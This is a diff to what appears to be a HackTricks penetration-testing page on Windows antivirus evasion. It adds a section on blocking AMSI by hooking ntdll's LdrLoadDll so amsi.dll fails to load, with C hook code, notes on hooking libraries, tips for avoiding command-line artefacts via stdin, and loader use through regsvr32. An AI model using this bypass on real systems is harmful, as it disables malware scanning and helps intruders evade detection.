@@ -275,7 +275,42 @@ This technique was initially discovered by [@RastaMouse](https://twitter.com/_Ra
 
 There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
 
-This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.
+### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)
+
+AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.
+
+Implementation outline (x64 C/C++ pseudocode):
+```c
+#include <windows.h>
+#include <winternl.h>
+
+typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
+static pLdrLoadDll realLdrLoadDll;
+
+NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
+    if (module && module->Buffer){
+        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
+        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
+            // Pretend the DLL cannot be found → AMSI never initialises in this process
+            return STATUS_DLL_NOT_FOUND; // 0xC0000135
+        }
+    }
+    return realLdrLoadDll(path, flags, module, handle);
+}
+
+void InstallHook(){
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
+    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
+    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
+}
+```
+Notes
+- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
+- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
+- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).
+
+This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.
 
 **Remove the detected signature**
 
@@ -905,5 +940,7 @@ References for PPL and tooling
 - [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
 - [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
 - [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
+
+- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
 
 {{#include ../banners/hacktricks-training.md}}
